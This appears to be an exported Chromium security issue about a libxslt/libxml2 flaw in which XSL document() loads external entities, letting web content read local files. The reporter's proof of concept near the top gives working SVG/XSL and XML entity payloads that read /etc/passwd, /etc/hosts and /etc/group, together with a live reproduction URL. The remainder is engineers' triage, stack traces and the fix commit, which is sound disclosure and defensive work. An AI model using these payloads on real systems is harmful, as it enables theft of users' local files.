# Security: Libxslt arbitrary file reading using document() method and external entities.

| Field | Value |
|-------|-------|
| **Issue ID** | [40066577](https://issues.chromium.org/issues/40066577) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P2 |
| **Component** | Blink>XML |
| **Platforms** | Android, Linux, Mac, Windows, iOS, ChromeOS |
| **Reporter** | c0...@gmail.com |
| **Assignee** | dc...@chromium.org |
| **Created** | 2023-06-28 |
| **Bounty** | $3,000.00 |

## Description

**VULNERABILITY DETAILS**  

Short description: Libxslt is the default XSL library used in WebKit based browsers such as chrome, safari etc. Libxslt allows external entities inside documents that are loaded by XSL document() method. An attacker can bypass security restrictions, access file:// urls from http(s):// urls and gain file access.  

With the default sandbox attacker can read /etc/hosts file on ios (safari/chrome), mac (safari/chrome), android (chrome) and samsung tv (default browser).  

When the -no-sandbox attribute is used (Electron/PhantomJS) an attacker can read any file on any OS.

Proof of Concept:

SVG image, to be hosted somewhere on server:

<?xml version="1.0" encoding="UTF-8"?>
<?xml-stylesheet type="text/xsl" href="#"?>

<xsl:stylesheet id="color-change" version="1.0" xmlns:xsl="[http://www.w3.org/1999/XSL/Transform">](http://www.w3.org/1999/XSL/Transform%22%3E)

<xsl:template match="/">  

<svg version="1.1" id="Capa\_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" viewBox="0 0 1000 1000">  

<foreignObject id="myObj" width="1000" height="1000">  

<div style="font-size:xxx-large" xmlns="http://www.w3.org/1999/xhtml">  

<a href="#">#Copy me#</a><br/>  

**XSL:** <xsl:value-of select="system-property('xsl:version')"/><br/>  

**Vendor:** <xsl:value-of select="system-property('xsl:vendor')"/><br/>  

**Vendor URL:** <xsl:value-of select="system-property('xsl:vendor-url')"/><br/>  

\*\*document() \*\* <xsl:copy-of select="document('[http://host/xsl2.php')"/>](http://host/xsl2.php')%22/%3E)  

</div>  

</foreignObject>  

</svg>  

</xsl:template>  

</xsl:stylesheet>

Main file (test.svg):

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE p [
<!ENTITY passwd SYSTEM "file:///etc/passwd">
<!ENTITY hosts SYSTEM "file:///etc/hosts">
<!ENTITY group SYSTEM "file://localhost/etc/group">

]>

Content for loaded <http://host/xsl2.php> (PHP file used just for responding with "Cross-Origin-Resource-Sharing: \*" HTTP header on last line):

<p>
<p style="border-style: dotted;">/etc/passwd:
&passwd;
</p>
<p style="border-style: dotted;">/etc/hosts:
&hosts;
</p>
<p style="border-style: dotted;">/etc/group:
&group;
</p>
</p>
<?php header("Access-Control-Allow-Origin: \\*");?>

Recommendations for elimination:  

Improve sandbox, deny read access to specified files. Disallow to use file://path and \path URLs from external entities.

**VERSION**  

Chrome Version: Latest MacOS and IOS

**REPRODUCTION CASE**  

Use files shown above or browse to <http://188.68.220.248/js.svg>

**CREDIT INFORMATION**  

Reporter credit: Igor Sak-Sakovskii

## Attachments

- [server.js](attachments/server.js) (text/plain, 426 B)
- [test.svg](attachments/test.svg) (image/svg+xml, 881 B)
- [test.xsl](attachments/test.xsl) (text/plain, 394 B)

## Timeline

### [Deleted User] (2023-06-28)

[Empty comment from Monorail migration]

### es...@chromium.org (2023-06-29)

libxslt owners, can you please help triage?
(Note: I do not recommend visiting the provided PoC URL as it appears to actually read and dump system files)

[Monorail components: Blink>XML]

### [Deleted User] (2023-06-29)

[Empty comment from Monorail migration]

### ja...@chromium.org (2023-06-29)

It sounds like this is an issue with our integration with libxslt rather than libxslt itself, right? If its the latter, I can add the libxslt maintainer. If not, then I guess we have to fix something on our side but I don't understand how this repro works.

### [Deleted User] (2023-06-30)

Setting milestone and target because of medium severity.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### [Deleted User] (2023-07-10)

Setting Pri-1 to match security severity Medium. If this is incorrect, please reset the priority. Sheriffbot won't make this change again.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### [Deleted User] (2023-07-12)

dcheng: Uh oh! This issue still open and hasn't been updated in the last 14 days. This is a serious vulnerability, and we want to ensure that there's progress. Could you please leave an update with the current status and any potential blockers?

If you're not the right owner for this issue, could you please remove yourself as soon as possible or help us find the right one?

If the issue is fixed or you can't reproduce it, please close the bug. If you've started working on a fix, please set the status to Started.

Thanks for your time! To disable nags, add the Disable-Nags label.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### ja...@chromium.org (2023-07-14)

Well this is the scariest security bug I've ever seen...
I assume dcheng hasn't already started investigating.
I tried adding some logging in the constructor of network::URLLoader and network::URLLoaderFactory::CreateLoaderAndStart, but I didn't see the file:// URLs show up anywhere. No file:// URLs show up in the DevTools network panel either.
Is there a different codepath for loading file:// URLs?
I assume that the browser process, not the renderer process, is doing the actual filesystem access. xsltNewTransformContext appears to only get called from within the renderer process, not the browser process.

+mmenke do you know if there are other ways besides network::URLLoader to load file:// URLs? And possibly how a renderer for a http:// domain is disallowed from loading file:// URLs in the browser process?

### dc...@chromium.org (2023-07-14)

Ugh sorry I've been pretty backlogged.

document() function is implemented in libxslt: https://source.chromium.org/chromium/chromium/src/+/refs/heads/main:third_party/libxslt/src/libxslt/functions.c;l=213;drc=5578b78366de32caf83044e5ea2268e6d91af766

ENTITY * SYSTEM is implemented in libxml2: https://source.chromium.org/chromium/chromium/src/+/main:third_party/libxml/src/entities.c;l=154;drc=fd883f026e1406aea123e67081b0ced12d7ef930

Need to do a bit more digging to figure out how it's actually processed though.
TBH I'm not even sure why this is even a lever, argh.

### dc...@chromium.org (2023-07-14)

Ah the entity loading probably happens here: https://source.chromium.org/chromium/chromium/src/+/main:third_party/libxml/src/parser.c;l=7838;drc=1c03110363c1f60a4c538712f312fa6cd39186c6

I'm assuming Access-Control-Allow-Origin is somehow confusing whatever glue code into allowing the request to incorrectly go through.

### mm...@chromium.org (2023-07-14)

File URLs are handled in https://source.chromium.org/chromium/chromium/src/+/main:content/browser/loader/file_url_loader_factory.h;l=1

### mm...@chromium.org (2023-07-14)

Security checks are at  FileURLLoaderFactory::CreateLoaderAndStart: https://source.chromium.org/chromium/chromium/src/+/refs/heads/main:content/browser/loader/file_url_loader_factory.cc;l=794;drc=5578b78366de32caf83044e5ea2268e6d91af766;bpv=1;bpt=1

### dc...@chromium.org (2023-07-15)

I think the libxml security check is located in a different place: https://source.chromium.org/chromium/chromium/src/+/main:third_party/blink/renderer/core/xml/parser/xml_document_parser.cc;l=622;drc=f4e41d888204fc53d3a124e15e30520098e99562

Presumably the combination of document() + the access control header is confusing it somehow.

### mm...@chromium.org (2023-07-15)

We really shouldn't be doing security checks for file URLs in the renderer process - I didn't realize renderers had the ability to access file URLs without any browser-side safety checks.  That seems not good.

### dc...@chromium.org (2023-07-15)

self-contained repro hosted in nodejs

### dc...@chromium.org (2023-07-15)

libxml is pretty argh. There's a lot of synchronous fetching going on.

Here's a stack where we do deny the load:
#1 0x55ff9a76beb3 base::debug::StackTrace::StackTrace() [../../base/debug/stack_trace.cc:221:12]
#2 0x55ff9dc2593b blink::ShouldAllowExternalLoad() [../../third_party/blink/renderer/core/xml/parser/xml_document_parser.cc:596:19]
#3 0x55ff9dc250df blink::OpenFunc() [../../third_party/blink/renderer/core/xml/parser/xml_document_parser.cc:626:8]
#4 0x55ff9ba9237b __xmlParserInputBufferCreateFilename [../../third_party/libxml/src/xmlIO.c:2545:13]
#5 0x55ff9ba82691 xmlNewInputFromFile [../../third_party/libxml/src/parserInternals.c:1785:11]
#6 0x55ff9ba933b5 xmlLoadExternalEntity [../../third_party/libxml/src/xmlIO.c:4021:12]
#7 0x55ff9ba5d477 xmlSAX2ResolveEntity [../../third_party/libxml/src/SAX2.c:533:11]
#8 0x55ff9ba5d145 xmlSAX2ExternalSubset [../../third_party/libxml/src/SAX2.c:398:14]
#9 0x55ff9ba7a7aa xmlParseDocument [../../third_party/libxml/src/parser.c:10567:6]
#10 0x55ff9ba7d478 xmlDoRead [../../third_party/libxml/src/parser.c:14613:5]
#11 0x55ff9dc242a9 blink::XmlDocPtrForString() [../../third_party/blink/renderer/core/xml/parser/xml_document_parser.cc:1632:10]
#12 0x55ff9dc2f2fe blink::XSLTProcessor::TransformToString() [../../third_party/blink/renderer/core/xml/xslt_processor_libxslt.cc:316:29]
#13 0x55ff9dc2eb52 blink::XSLTProcessor::transformToFragment() [../../third_party/blink/renderer/core/xml/xslt_processor.cc:149:8]
#14 0x55ff9e4e7ae0 blink::(anonymous namespace)::v8_xslt_processor::TransformToFragmentOperationCallback() [gen/third_party/blink/renderer/bindings/core/v8/v8_xslt_processor.cc:347:39]
#15 0x55ff98cb3813 Builtins_CallApiCallbackGeneric

But it looks like XSLT document() processing doesn't hit this hook:
#0  xmlDefaultExternalEntityLoader () at ../../third_party/libxml/src/xmlIO.c:3940            
#1  0x000055555e2453b5 in xmlLoadExternalEntity () at ../../third_party/libxml/src/xmlIO.c:4021
#2  0x000055555e22ef75 in xmlCreateEntityParserCtxtInternal () at ../../third_party/libxml/src/parser.c:13407                                                                                 
#3  0x000055555e22998a in xmlParseExternalEntityPrivate () at ../../third_party/libxml/src/parser.c:12442                                                                                     
#4  0x000055555e228c6d in xmlParseReference () at ../../third_party/libxml/src/parser.c:6981   
#5  0x000055555e22e2af in xmlParseTryOrFinish () at ../../third_party/libxml/src/parser.c:11454
#6  xmlParseChunk () at ../../third_party/libxml/src/parser.c:11878
#7  0x00005555603e2246 in DocLoaderFunc() () at ../../third_party/blink/renderer/core/xml/xslt_processor_libxslt.cc:147                                                                       
#8  0x000055556079b48d in xsltLoadDocument () at ../../third_party/libxslt/src/libxslt/documents.c:319                                                                                        
#9  0x00005555607adc13 in xsltDocumentFunctionLoadDocument () at ../../third_party/libxslt/src/libxslt/functions.c:136                                                                        
#10 0x00005555607adad4 in xsltDocumentFunction () at ../../third_party/libxslt/src/libxslt/functions.c:333                 
#11 0x000055555e258498 in xmlXPathCompOpEval () at ../../third_party/libxml/src/xpath.c:13195  
#12 0x000055555e25810e in xmlXPathCompOpEval () at ../../third_party/libxml/src/xpath.c:13347                                                                                                 
#13 0x000055555e25410e in xmlXPathRunEval () at ../../third_party/libxml/src/xpath.c:13927     
#14 0x000055555e253d6f in xmlXPathCompiledEvalInternal () at ../../third_party/libxml/src/xpath.c:14319                                                                                       
#15 0x000055555e253cab in xmlXPathCompiledEval () at ../../third_party/libxml/src/xpath.c:14365
#16 0x00005555607ab104 in xsltPreCompEval () at ../../third_party/libxslt/src/libxslt/transform.c:378                                                                                         
#17 xsltCopyOf () at ../../third_party/libxslt/src/libxslt/transform.c:4406                    
#18 0x00005555607a8b7f in xsltApplySequenceConstructor () at ../../third_party/libxslt/src/libxslt/transform.c:2747                                                                           
#19 0x00005555607a86f5 in xsltApplyXSLTTemplate () at ../../third_party/libxslt/src/libxslt/transform.c:3205                                                                                  
#20 0x00005555607ad03b in xsltProcessOneNode () at ../../third_party/libxslt/src/libxslt/transform.c:2108                                                                                     
#21 xsltApplyStylesheetInternal () at ../../third_party/libxslt/src/libxslt/transform.c:6020   
#22 0x00005555603e1728 in TransformToString() () at ../../third_party/blink/renderer/core/xml/xslt_processor_libxslt.cc:408                                                                   
#23 0x00005555603cedb6 in ApplyXSLTransform() () at ../../third_party/blink/renderer/core/xml/document_xslt.cc:81                                                                             
#24 0x00005555603cf346 in Invoke() () at ../../third_party/blink/renderer/core/xml/document_xslt.cc:48                                                                                        
#25 0x000055555f68f6b3 in FireEventListeners() () at ../../third_party/blink/renderer/core/dom/events/event_target.cc:919
#26 0x000055555f68eadb in FireEventListeners() () at ../../third_party/blink/renderer/core/dom/events/event_target.cc:837                                                                     
#27 0x00005555608e23c2 in DispatchEventAtBubbling() () at ../../third_party/blink/renderer/core/dom/events/event_dispatcher.cc:345
#28 0x00005555608e1cd5 in Dispatch() () at ../../third_party/blink/renderer/core/dom/events/event_dispatcher.cc:275
#29 0x00005555608e1184 in DispatchEvent() () at ../../third_party/blink/renderer/core/dom/events/event_dispatcher.cc:74
#30 0x000055556081fdfe in FinishedParsing() () at ../../third_party/blink/renderer/core/dom/document.cc:7526
#31 0x00005555603d063d in end() () at ../../third_party/blink/renderer/core/xml/parser/xml_document_parser.cc:436
#32 0x000055555ffea7be in FinishedLoading() () at ../../third_party/blink/renderer/core/loader/document_loader.cc:1235
#33 0x000055555ffea3f3 in BodyLoadingFinished() () at ../../third_party/blink/renderer/core/loader/document_loader.cc:1148

### mm...@chromium.org (2023-07-15)

I can't get it to work on Windows, but I think we eat the "localhost" in file URLs on Windows, but not on other platforms, so that seems like it might explain the difference.  I could also be doing something wrong with the setup, though (Not using node.js, but a browser test with mock headers).

### mm...@chromium.org (2023-07-15)

And yes, I'm using windows-appropriate paths, which could also be the difference, but suspect it's the eaten hosts.

### dc...@chromium.org (2023-07-15)

OK, I have a fix for this.

mmenke@, I'm not planning on doing anything more at the moment. Basically the problem is we do install hooks so that libxml doesn't do it's own IO, but if those hooks aren't used, the only that's stopping libxml is the sandbox.

I did do some basic tests that the renderer can't make network requests (and thus turn this into an arbitrary site isolation bypass). Whew. I think.

### dc...@chromium.org (2023-07-15)

Also the headers aren't needed for this bug to repro. I've been told that the Windows sandbox blocks file reads, so that might be why (at least in Chrome Linux, I had to test with --no-sandbox).

### c0...@gmail.com (2023-07-17)

Hey, just wanted to note that looks like PHP affected by default

### gi...@appspot.gserviceaccount.com (2023-07-17)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src/+/1f798a8525fb85be1a4aa526bdb8420f8cdced0e

commit 1f798a8525fb85be1a4aa526bdb8420f8cdced0e
Author: Daniel Cheng <dcheng@chromium.org>
Date: Mon Jul 17 19:06:10 2023

Set current document when processing xsl document().

This is needed to look up various properties of the owning document when
parsing XML in Blink.

Bug: 1458911
Change-Id: If97b6a0a3364c526539c5b7bc0fd40dc01fd1731
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/4691202
Reviewed-by: Joey Arhar <jarhar@chromium.org>
Commit-Queue: Daniel Cheng <dcheng@chromium.org>
Cr-Commit-Position: refs/heads/main@{#1171307}

[modify] https://crrev.com/1f798a8525fb85be1a4aa526bdb8420f8cdced0e/third_party/blink/renderer/core/xml/xslt_processor_libxslt.cc
[add] https://crrev.com/1f798a8525fb85be1a4aa526bdb8420f8cdced0e/third_party/blink/web_tests/http/tests/xsl/resources/xsl-using-document-with-external-entity-target-document.xml
[add] https://crrev.com/1f798a8525fb85be1a4aa526bdb8420f8cdced0e/third_party/blink/web_tests/http/tests/xsl/xsl-using-document-with-external-entity.xml
[add] https://crrev.com/1f798a8525fb85be1a4aa526bdb8420f8cdced0e/third_party/blink/web_tests/http/tests/xsl/xsl-using-document-with-external-entity-expected.txt


### dc...@chromium.org (2023-07-17)

[Empty comment from Monorail migration]

### [Deleted User] (2023-07-18)

[Empty comment from Monorail migration]

### [Deleted User] (2023-07-18)

[Empty comment from Monorail migration]

### am...@chromium.org (2023-07-31)

The bot appears to be sleeping on the job here, and this issue look sufficiently impactful enough to not delay on this. I'd like to get this backmerged to M116 now since we are already in M115 Stable and stable respin is in the process of being cut soon or tomorrow. 
Merge approved for M116, please merge this fix to branch 5845 at soonest so this fix can be included in the next M116/Beta release. 

### ja...@chromium.org (2023-08-01)

ill do the merge since dcheng is ooo

### ja...@chromium.org (2023-08-01)

[Empty comment from Monorail migration]

### ja...@chromium.org (2023-08-01)

https://chromium-review.googlesource.com/c/chromium/src/+/4736613

### gi...@appspot.gserviceaccount.com (2023-08-01)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src/+/12539963e46ae02e2ae087f486049541025ca2a9

commit 12539963e46ae02e2ae087f486049541025ca2a9
Author: Daniel Cheng <dcheng@chromium.org>
Date: Tue Aug 01 07:19:39 2023

Set current document when processing xsl document().

This is needed to look up various properties of the owning document when
parsing XML in Blink.

(cherry picked from commit 1f798a8525fb85be1a4aa526bdb8420f8cdced0e)

Bug: 1458911
Change-Id: If97b6a0a3364c526539c5b7bc0fd40dc01fd1731
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/4691202
Reviewed-by: Joey Arhar <jarhar@chromium.org>
Commit-Queue: Daniel Cheng <dcheng@chromium.org>
Cr-Original-Commit-Position: refs/heads/main@{#1171307}
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/4736613
Auto-Submit: Joey Arhar <jarhar@chromium.org>
Reviewed-by: Daniel Cheng <dcheng@chromium.org>
Cr-Commit-Position: refs/branch-heads/5845@{#997}
Cr-Branched-From: 5a5dff63a4a4c63b9b18589819bebb2566c85443-refs/heads/main@{#1160321}

[modify] https://crrev.com/12539963e46ae02e2ae087f486049541025ca2a9/third_party/blink/renderer/core/xml/xslt_processor_libxslt.cc
[add] https://crrev.com/12539963e46ae02e2ae087f486049541025ca2a9/third_party/blink/web_tests/http/tests/xsl/resources/xsl-using-document-with-external-entity-target-document.xml
[add] https://crrev.com/12539963e46ae02e2ae087f486049541025ca2a9/third_party/blink/web_tests/http/tests/xsl/xsl-using-document-with-external-entity.xml
[add] https://crrev.com/12539963e46ae02e2ae087f486049541025ca2a9/third_party/blink/web_tests/http/tests/xsl/xsl-using-document-with-external-entity-expected.txt


### [Deleted User] (2023-08-01)

LTS Milestone M114

This issue has been flagged as a merge candidate for Chrome OS' LTS channel. If selected, our merge team will handle any additional merges. To help us determine if this issue requires a merge to LTS, please answer this short questionnaire:
1. Was this issue a regression for the milestone it was found in?
2. Is this issue related to a change or feature merged after the latest LTS Milestone?



For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### rz...@google.com (2023-08-01)

[Empty comment from Monorail migration]

### rz...@google.com (2023-08-01)

[Empty comment from Monorail migration]

### [Deleted User] (2023-08-01)

This issue requires additional review before it can be merged to the LTS channel. Please answer the following questions to help us evaluate this merge:

1. Number of CLs needed for this fix and links to them.
2. Level of complexity (High, Medium, Low - Explain)
3. Has this been merged to a stable release? beta release?
4. Overall Recommendation (Yes, No)



For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### rz...@google.com (2023-08-01)

1. Just https://crrev.com/c/4738013
2. Low, no conflicts
3. 116
4. Yes

### aj...@chromium.org (2023-08-02)

Follow-up - on Windows these file accesses are attempted directly from the renderer process:-

```
0	FLTMGR.SYS	FltDecodeParameters + 0x210c	0xfffff8054f3264cc	C:\WINDOWS\System32\drivers\FLTMGR.SYS
1	FLTMGR.SYS	FltDecodeParameters + 0x1bba	0xfffff8054f325f7a	C:\WINDOWS\System32\drivers\FLTMGR.SYS
2	FLTMGR.SYS	FltAddOpenReparseEntry + 0x560	0xfffff8054f359f40	C:\WINDOWS\System32\drivers\FLTMGR.SYS
3	ntoskrnl.exe	IofCallDriver + 0x55	0xfffff8054de113a5	C:\WINDOWS\system32\ntoskrnl.exe
4	ntoskrnl.exe	IoGetAttachedDevice + 0x54	0xfffff8054de0d964	C:\WINDOWS\system32\ntoskrnl.exe
5	ntoskrnl.exe	SeCreateAccessStateEx + 0x17fb	0xfffff8054e1ffabb	C:\WINDOWS\system32\ntoskrnl.exe
6	ntoskrnl.exe	SeCreateAccessStateEx + 0x347	0xfffff8054e1fe607	C:\WINDOWS\system32\ntoskrnl.exe
7	ntoskrnl.exe	ObReferenceObjectByHandle + 0x375e	0xfffff8054e21571e	C:\WINDOWS\system32\ntoskrnl.exe
8	ntoskrnl.exe	ObOpenObjectByNameEx + 0x1fa	0xfffff8054e20d3ea	C:\WINDOWS\system32\ntoskrnl.exe
9	ntoskrnl.exe	NtCreateFile + 0x13bb	0xfffff8054e1fd5db	C:\WINDOWS\system32\ntoskrnl.exe
10	ntoskrnl.exe	NtCreateFile + 0x79	0xfffff8054e1fc299	C:\WINDOWS\system32\ntoskrnl.exe
11	ntoskrnl.exe	setjmpex + 0x82b5	0xfffff8054e00f8f5	C:\WINDOWS\system32\ntoskrnl.exe
12	ntdll.dll	ZwCreateFile + 0x14	0x7fffe0d8da84	C:\WINDOWS\SYSTEM32\ntdll.dll
13	KERNELBASE.dll	CreateFileW + 0x5f9	0x7fffde646579	C:\WINDOWS\System32\KERNELBASE.dll
14	KERNELBASE.dll	CreateFileW + 0x66	0x7fffde645fe6	C:\WINDOWS\System32\KERNELBASE.dll
15	chrome.dll	common_stat<_stat64i32> + 0x72, D:\chromium\src\out\release\minkernel\crts\ucrt\src\appcrt\filesystem\stat.cpp(461)	0x7fff3abb79fa	D:\chromium\src\out\Release\chrome.dll
16	chrome.dll	xmlCheckFilename + 0x86, D:\chromium\src\third_party\libxml\src\xmlIO.c(703)	0x7fff3ddceeb6	D:\chromium\src\out\Release\chrome.dll
17	chrome.dll	xmlLoadExternalEntity + 0x70, D:\chromium\src\third_party\libxml\src\xmlIO.c(4006)	0x7fff3ddd0560	D:\chromium\src\out\Release\chrome.dll
18	chrome.dll	xmlCreateEntityParserCtxtInternal + 0x8c, D:\chromium\src\third_party\libxml\src\parser.c(13407)	0x7fff3d5a10ac	D:\chromium\src\out\Release\chrome.dll
19	chrome.dll	xmlParseExternalEntityPrivate + 0xfa, D:\chromium\src\third_party\libxml\src\parser.c(12442)	0x7fff3d59e8ba	D:\chromium\src\out\Release\chrome.dll
20	chrome.dll	xmlParseReference + 0x6a5, D:\chromium\src\third_party\libxml\src\parser.c(6980)	0x7fff363aec55	D:\chromium\src\out\Release\chrome.dll
21	chrome.dll	xmlParseChunk + 0x362, D:\chromium\src\third_party\libxml\src\parser.c(11878)	0x7fff3a8526f2	D:\chromium\src\out\Release\chrome.dll
22	chrome.dll	blink::XSLTProcessor::TransformToString + 0x10e5	0x7fff3f86bde5	D:\chromium\src\out\Release\chrome.dll
23	chrome.dll	xsltLoadDocument + 0x92, D:\chromium\src\third_party\libxslt\src\libxslt\documents.c(319)	0x7fff40087632	D:\chromium\src\out\Release\chrome.dll
24	chrome.dll	xsltDocumentFunctionLoadDocument + 0xd2, D:\chromium\src\third_party\libxslt\src\libxslt\functions.c(134)	0x7fff4059f8f2	D:\chromium\src\out\Release\chrome.dll
25	chrome.dll	xsltDocumentFunction + 0x377, D:\chromium\src\third_party\libxslt\src\libxslt\functions.c(333)	0x7fff4059f807	D:\chromium\src\out\Release\chrome.dll
26	chrome.dll	xmlXPathCompOpEval + 0x4fa, D:\chromium\src\third_party\libxml\src\xpath.c(13195)	0x7fff3dddd68a	D:\chromium\src\out\Release\chrome.dll
27	chrome.dll	xmlXPathCompOpEval + 0x394, D:\chromium\src\third_party\libxml\src\xpath.c(13346)	0x7fff3dddd524	D:\chromium\src\out\Release\chrome.dll
28	chrome.dll	xmlXPathRunEval + 0xbe, D:\chromium\src\third_party\libxml\src\xpath.c(13927)	0x7fff3ddd9f8e	D:\chromium\src\out\Release\chrome.dll
29	chrome.dll	xmlXPathCompiledEvalInternal + 0x14e, D:\chromium\src\third_party\libxml\src\xpath.c(14316)	0x7fff3ddd9d3e	D:\chromium\src\out\Release\chrome.dll
30	chrome.dll	xmlXPathCompiledEval + 0x2b, D:\chromium\src\third_party\libxml\src\xpath.c(14365)	0x7fff3ddd9bcb	D:\chromium\src\out\Release\chrome.dll
31	chrome.dll	xsltCopyOf + 0x96, D:\chromium\src\third_party\libxslt\src\libxslt\transform.c(4406)	0x7fff40082166	D:\chromium\src\out\Release\chrome.dll
32	chrome.dll	xsltApplySequenceConstructor + 0x297, D:\chromium\src\third_party\libxslt\src\libxslt\transform.c(2876)	0x7fff4007fd97	D:\chromium\src\out\Release\chrome.dll
33	chrome.dll	xsltApplyXSLTTemplate + 0x43c, D:\chromium\src\third_party\libxslt\src\libxslt\transform.c(3205)	0x7fff4007f87c	D:\chromium\src\out\Release\chrome.dll
34	chrome.dll	xsltProcessOneNode + 0x44, D:\chromium\src\third_party\libxslt\src\libxslt\transform.c(2104)	0x7fff4007f184	D:\chromium\src\out\Release\chrome.dll
35	chrome.dll	xsltApplyStylesheetInternal + 0x5db, D:\chromium\src\third_party\libxslt\src\libxslt\transform.c(6020)	0x7fff40083fab	D:\chromium\src\out\Release\chrome.dll
36	chrome.dll	blink::XSLTProcessor::TransformToString + 0x6fc	0x7fff3f86b3fc	D:\chromium\src\out\Release\chrome.dll
37	chrome.dll	blink::SecurityContextInit::InitDocumentPolicyFrom + 0x693	0x7fff3ec4cf33	D:\chromium\src\out\Release\chrome.dll
38	chrome.dll	blink::DocumentXSLT::SheetLoaded + 0x88	0x7fff3ec4d2b8	D:\chromium\src\out\Release\chrome.dll
39	chrome.dll	blink::ProcessingInstruction::SheetLoaded + 0x57	0x7fff3e9f3777	D:\chromium\src\out\Release\chrome.dll
40	chrome.dll	blink::ProcessingInstruction::NotifyFinished + 0x297	0x7fff3e9f3a47	D:\chromium\src\out\Release\chrome.dll
41	chrome.dll	blink::Resource::NotifyFinished + 0x121, D:\chromium\src\third_party\blink\renderer\platform\loader\fetch\resource.cc(239)	0x7fff3a76e831	D:\chromium\src\out\Release\chrome.dll
42	chrome.dll	blink::XSLStyleSheetResource::NotifyFinished + 0x9d	0x7fff3f6b3e0d	D:\chromium\src\out\Release\chrome.dll
43	chrome.dll	blink::ResourceFetcher::HandleLoaderFinish + 0x3dc, D:\chromium\src\third_party\blink\renderer\platform\loader\fetch\resource_fetcher.cc(2285)	0x7fff35bf60ec	D:\chromium\src\out\Release\chrome.dll
44	chrome.dll	blink::ResourceLoader::DidFinishLoading + 0x1cb, D:\chromium\src\third_party\blink\renderer\platform\loader\fetch\resource_loader.cc(1334)	0x7fff35bf58eb	D:\chromium\src\out\Release\chrome.dll
45	chrome.dll	blink::ResourceLoader::DidFinishLoadingBody + 0x52, D:\chromium\src\third_party\blink\renderer\platform\loader\fetch\resource_loader.cc(636)	0x7fff35bf5712	D:\chromium\src\out\Release\chrome.dll
46	chrome.dll	blink::ResponseBodyLoader::OnStateChange + 0x253, D:\chromium\src\third_party\blink\renderer\platform\loader\fetch\response_body_loader.cc(572)	0x7fff35ccbde3	D:\chromium\src\out\Release\chrome.dll
47	chrome.dll	blink::URLLoader::Context::OnCompletedRequest + 0x1c6, D:\chromium\src\third_party\blink\renderer\platform\loader\fetch\url_loader\url_loader.cc(446)	0x7fff3839f9a6	D:\chromium\src\out\Release\chrome.dll
48	chrome.dll	blink::ResourceRequestSender::OnRequestComplete + 0x222, D:\chromium\src\third_party\blink\renderer\platform\loader\fetch\url_loader\resource_request_sender.cc(569)	0x7fff35c877d2	D:\chromium\src\out\Release\chrome.dll
49	chrome.dll	blink::ThrottlingURLLoader::OnComplete + 0x4f, D:\chromium\src\third_party\blink\common\loader\throttling_url_loader.cc(928)	0x7fff37444c2f	D:\chromium\src\out\Release\chrome.dll
50	chrome.dll	network::mojom::URLLoaderClientStubDispatch::Accept + 0x31a, D:\chromium\src\out\release\gen\services\network\public\mojom\url_loader.mojom.cc(1294)	0x7fff35c3132a	D:\chromium\src\out\Release\chrome.dll
51	chrome.dll	mojo::InterfaceEndpointClient::HandleIncomingMessageThunk::Accept + 0xac8, D:\chromium\src\mojo\public\cpp\bindings\lib\interface_endpoint_client.cc(362)	0x7fff3a2d91b8	D:\chromium\src\out\Release\chrome.dll
52	chrome.dll	mojo::internal::MultiplexRouter::Accept + 0x99f, D:\chromium\src\mojo\public\cpp\bindings\lib\multiplex_router.cc(707)	0x7fff3a16ba1f	D:\chromium\src\out\Release\chrome.dll
53	chrome.dll	mojo::MessageDispatcher::Accept + 0x296, D:\chromium\src\mojo\public\cpp\bindings\lib\message_dispatcher.cc(42)	0x7fff39c506f6	D:\chromium\src\out\Release\chrome.dll
54	chrome.dll	base::internal::Invoker<base::internal::BindState<void (mojo::Connector::*)(const char *, unsigned int),base::internal::UnretainedWrapper<mojo::Connector,base::unretained_traits::MayNotDangle,0>,base::internal::UnretainedWrapper<const char,base::unretained_traits::MayNotDangle,0> >,void (unsigned int)>::Run + 0x528, D:\chromium\src\base\functional\bind_internal.h(957)	0x7fff3d29e158	D:\chromium\src\out\Release\chrome.dll
55	chrome.dll	base::internal::Invoker<base::internal::BindState<void (*)(const base::RepeatingCallback<void (unsigned int)> &, unsigned int, const mojo::HandleSignalsState &),base::RepeatingCallback<void (unsigned int)> >,void (unsigned int, const mojo::HandleSignalsState &)>::Run + 0x45, D:\chromium\src\base\functional\bind_internal.h(950)	0x7fff3a99c7a5	D:\chromium\src\out\Release\chrome.dll
56	chrome.dll	mojo::SimpleWatcher::OnHandleReady + 0x139, D:\chromium\src\mojo\public\cpp\system\simple_watcher.cc(277)	0x7fff385eaf69	D:\chromium\src\out\Release\chrome.dll
57	chrome.dll	base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWork + 0x27a9, D:\chromium\src\base\task\sequence_manager\thread_controller_with_message_pump_impl.cc(344)	0x7fff39b94669	D:\chromium\src\out\Release\chrome.dll
58	chrome.dll	base::MessagePumpDefault::Run + 0x88, D:\chromium\src\base\message_loop\message_pump_default.cc(41)	0x7fff39ff9798	D:\chromium\src\out\Release\chrome.dll
59	chrome.dll	base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::Run + 0xe0, D:\chromium\src\base\task\sequence_manager\thread_controller_with_message_pump_impl.cc(645)	0x7fff35cdf400	D:\chromium\src\out\Release\chrome.dll
60	chrome.dll	base::RunLoop::Run + 0x1ca, D:\chromium\src\base\run_loop.cc(134)	0x7fff35d299da	D:\chromium\src\out\Release\chrome.dll
61	chrome.dll	content::RendererMain + 0x9d6, D:\chromium\src\content\renderer\renderer_main.cc(339)	0x7fff38872ba6	D:\chromium\src\out\Release\chrome.dll
62	chrome.dll	content::RunOtherNamedProcessTypeMain + 0x253, D:\chromium\src\content\app\content_main_runner_impl.cc(741)	0x7fff38423e03	D:\chromium\src\out\Release\chrome.dll
